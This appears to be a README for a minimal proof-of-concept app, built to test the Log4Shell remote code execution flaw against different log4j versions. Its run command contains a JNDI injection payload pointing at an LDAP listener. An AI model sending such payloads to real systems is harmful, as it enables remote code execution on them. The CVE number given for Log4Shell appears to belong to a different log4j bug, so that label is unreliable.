# Log4Shell vulnerable app

This directory has a minimal proof-of-concept for the "Log4Shell" log4j remote code execution vulnerability
([CVE-2021-44832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832)). The vulnerable Java code
simply creates a log4j logging instance and logs every command line argument string in `argv` as an error.
It uses log4j version 2.14.1.

## Compiling the vulnerable app

```shell
make log4shell-poc.jar
```

This JAR file contains the vulnerable app, but not log4j. This enables you to test it against different 
versions of log4j.

## Running the vulnerable app

```shell
java -cp log4shell-poc.jar:lib/log4j-api-2.14.1.jar:lib/log4j-core-2.14.1.jar "About to pwn" '${jndi:ldap://127.0.0.1:1337/pwn}'
```
or from the Makefile:
```shell
make run
```

## Testing the vulnerability

The [test_exploit.py](test_exploit.py) script runs the app with a payload that exploits the bug. The
script will exit with code zero if the bug was confirmed exploited.

You can run the script directly with `python3` or do so from the Makefile:
```shell
make test
```
